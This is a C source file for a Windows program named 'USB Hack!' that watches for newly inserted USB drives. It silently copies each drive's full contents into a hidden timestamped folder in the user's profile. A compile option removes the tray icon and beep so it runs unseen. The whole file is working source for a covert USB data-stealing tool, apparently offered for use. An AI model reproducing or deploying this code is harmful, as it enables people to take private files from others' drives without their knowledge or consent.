#include <windows.h>
#include <Userenv.h>
#include <shellapi.h>
#include <Dbt.h>


#include "resource.h"

//#define NO_SYS_TRAY

#define	WM_USER_SHELLICON (WM_USER + 1)
#define IDI_SYSTRAY 0


static const TCHAR g_szClassName[] = TEXT("USBWindowClass");
static TCHAR szHomeDirBuf[MAX_PATH+1];
//
static HANDLE g_hCurrProc          = ((HANDLE)-1);
static HINSTANCE g_hInstance       = NULL;
static HWND g_hWnd                 = NULL;
static BOOL g_bEnable              = TRUE;

#ifndef NO_SYS_TRAY
static const TCHAR g_TrayToolTip[] = TEXT("USB Hack!");
static HMENU g_hPopMenu;
NOTIFYICONDATA g_nidApp;
#endif



static BOOL SetOutPutDir()
{
	BOOL rt = FALSE;

	const TCHAR szDriveHack[] = TEXT("\\USB_HACK\\");
	const TCHAR szfmt[]       = TEXT("hh-mm-ss tt");
	TCHAR szOutPut[12];

	if (!GetTimeFormat(LOCALE_USER_DEFAULT, LOCALE_USE_CP_ACP, NULL, szfmt, szOutPut, 12))
		return FALSE;

	HANDLE hToken = 0;
	if (OpenProcessToken( GetCurrentProcess(), TOKEN_QUERY, &hToken ) )
	{

		DWORD BufSize = MAX_PATH-24;//TODO:-(11+12+1)
		if (GetUserProfileDirectory( hToken, szHomeDirBuf, &BufSize ))
		{
			lstrcat(szHomeDirBuf, szDriveHack);

			DWORD attrib= GetFileAttributes(szHomeDirBuf);
			if (!(attrib != 0xffffffff && (attrib & FILE_ATTRIBUTE_DIRECTORY) ))
				CreateDirectory(szHomeDirBuf, NULL);

			lstrcat(szHomeDirBuf, szOutPut);
			CreateDirectory(szHomeDirBuf, NULL);
			szHomeDirBuf[BufSize+11+12]= '\0';//TODO:b
			rt = TRUE;
		}

		CloseHandle( hToken );
	}

	return rt;
}

static void CopyDrive(TCHAR *src)
{
    SHFILEOPSTRUCT s = { 0 };
    s.hwnd = g_hWnd;
    s.wFunc = FO_COPY;
    s.pTo = szHomeDirBuf;
    s.pFrom = src;
    s.fFlags = FOF_SILENT;
    SHFileOperation( &s );
}

#ifndef NO_SYS_TRAY
static LRESULT CALLBACK OnIconRButtonDown( HWND hwnd )
{
	POINT pt;

	GetCursorPos( &pt );
	SetForegroundWindow( hwnd );
	TrackPopupMenu( g_hPopMenu, TPM_LEFTBUTTON, pt.x, pt.y, 0, hwnd, NULL );

	return 0;
}

static LRESULT CALLBACK OnAbout( HWND hwnd )
{
//TODO: version
	static const TCHAR msg[]=
	TEXT("USB Hack!\r\n\r\n")
	TEXT("Copy new inserted USB drive!!\r\n\r\n")
	TEXT("Version: 0.0.2\r\n\r\n")
	TEXT("Copyright (c) 2013 IMLA Assuom");

	MSGBOXPARAMS msgbox=
	{
		sizeof(MSGBOXPARAMS),
		NULL,
		g_hInstance,
		msg,
		TEXT("About"),
		MB_USERICON,
		MAKEINTRESOURCE(IDI_ICON1),
		0,
		NULL,
		GetUserDefaultLangID()
	};
	MessageBoxIndirect( &msgbox );

	SetProcessWorkingSetSize( g_hCurrProc, -1, -1 );

	return 0;
}

static LRESULT CALLBACK OnEnable( HWND hwnd )
{
	if (g_bEnable)
		CheckMenuItem(g_hPopMenu, IDM_ENABLE, MF_UNCHECKED);
	else
		CheckMenuItem(g_hPopMenu, IDM_ENABLE, MF_CHECKED);
	g_bEnable = !g_bEnable;

	return 0;
}
#endif

static LRESULT CALLBACK OnDestroy( HWND hwnd )
{
#ifndef NO_SYS_TRAY
	Shell_NotifyIcon( NIM_DELETE, &g_nidApp );
#endif
	PostQuitMessage(0);

	return 0;
}

static LRESULT CALLBACK OnDeviceArrival(HWND hwnd, PDEV_BROADCAST_HDR lpDevHdr )
{
	if ( ( lpDevHdr->dbch_devicetype == DBT_DEVTYP_VOLUME )
		&& !( ((PDEV_BROADCAST_VOLUME)lpDevHdr)->dbcv_flags & ( DBTF_MEDIA|DBTF_NET ) ) )
	{

		if (!SetOutPutDir())
			return 0;//TODO:

		DWORD dwDriveMask = ((PDEV_BROADCAST_VOLUME)lpDevHdr)->dbcv_unitmask;
		TCHAR szDrive[] = TEXT(" :\\*\0");

	   for (int i = 0; i < 26; ++i)
	   {
			if (dwDriveMask & 0x1)
			{
				szDrive[0] = 'A' + i;
				CopyDrive(szDrive);
			}
			dwDriveMask = dwDriveMask >> 1;
	   }

#ifndef NO_SYS_TRAY
		MessageBeep(MB_ICONSTOP);
#endif
	}

	return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	LRESULT lr = 1;

    switch(msg)
    {
		case WM_DEVICECHANGE:
			switch (wParam)
			{
			case DBT_DEVICEARRIVAL:
#ifndef NO_SYS_TRAY
				if (!g_bEnable)
					return DefWindowProc( hwnd, msg, wParam, lParam );
#endif
				SetPriorityClass( g_hCurrProc, HIGH_PRIORITY_CLASS );
				lr = OnDeviceArrival( hwnd, (PDEV_BROADCAST_HDR)lParam );
				SetPriorityClass( g_hCurrProc, ABOVE_NORMAL_PRIORITY_CLASS );
			break;
			default:
				return DefWindowProc( hwnd, msg, wParam, lParam );
			}
		break;
#ifndef NO_SYS_TRAY
		case WM_USER_SHELLICON:
			switch (lParam)
			{
				case WM_RBUTTONDOWN:
					lr = OnIconRButtonDown( hwnd );
				break;
				default:
				break;
			}
		break;
		case WM_COMMAND:
			switch( LOWORD( wParam ) )
			{
			case IDM_EXIT:
				lr = OnDestroy( hwnd );
				break;
			case IDM_ENABLE:
				lr = OnEnable( hwnd );
				break;
			case IDM_ABOUT:
				lr = OnAbout( hwnd );
			default:
				return DefWindowProc( hwnd, msg, wParam, lParam );
				break;
			}

		break;
#endif
        case WM_DESTROY:
            lr = OnDestroy( hwnd );
        break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }

    return lr;//msg.wParam;
}

static BOOL Initialize()
{
    WNDCLASSEX wc;

	g_hInstance = GetModuleHandle(NULL);

	if (!g_hInstance)
		return FALSE;

	wc.cbSize        = sizeof(WNDCLASSEX);
    wc.style         = CS_NOCLOSE;
    wc.lpfnWndProc   = WndProc;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = g_hInstance;
    wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(NULL);
    wc.lpszMenuName  = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);

	if ( !RegisterClassEx(&wc) )
        return FALSE;

	//
    g_hWnd = CreateWindowEx(WS_EX_TOOLWINDOW, g_szClassName, NULL, WS_POPUP,
							0, 0, 1, 1, NULL, NULL, g_hInstance, NULL);
	if (g_hWnd == NULL)
    {
		UnregisterClass( g_szClassName, g_hInstance );
		return FALSE;
    }
	SetWindowPos( g_hWnd, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE );

	//
#ifndef NO_SYS_TRAY
	HMENU hMenu = LoadMenu(g_hInstance, MAKEINTRESOURCE(IDR_MENU1));
	if (hMenu == NULL)
		return FALSE;

	g_hPopMenu      = GetSubMenu(hMenu, 0);
    CheckMenuItem(g_hPopMenu, IDM_ENABLE, MF_CHECKED);

	HICON hTrayIcon = LoadIcon(g_hInstance, MAKEINTRESOURCE(IDI_ICON1));
	g_nidApp.cbSize = sizeof( NOTIFYICONDATA );
	g_nidApp.hWnd   = ( HWND ) g_hWnd;
	g_nidApp.uID    = IDI_SYSTRAY;
	g_nidApp.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
	g_nidApp.hIcon  = hTrayIcon;
	g_nidApp.uCallbackMessage = WM_USER_SHELLICON;
	lstrcpy(g_nidApp.szTip, g_TrayToolTip);
	if ( !Shell_NotifyIcon(NIM_ADD, &g_nidApp) )
		return FALSE;
#endif

	return TRUE;
}


#if defined(_DEBUG)
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nCmdShow)
#else
void WINAPI USBMain()
#endif
{
    MSG Msg;

	g_hWnd = FindWindow( g_szClassName, NULL );
	if (g_hWnd == NULL)
	{
		g_hCurrProc = GetCurrentProcess();
		SetPriorityClass( g_hCurrProc, ABOVE_NORMAL_PRIORITY_CLASS );

		if ( !Initialize() )
		{
			MessageBox( NULL, TEXT("Init failed!"), NULL, MB_ICONERROR );
		}
		else
		{
			while( GetMessage( &Msg, NULL, 0, 0 ) > 0 )
			{
				TranslateMessage(&Msg);
				DispatchMessage(&Msg);
			}
		}
	}
#if defined(_DEBUG)
	return 0;
#else
	ExitProcess( 0 );
#endif // _DEBUG
}
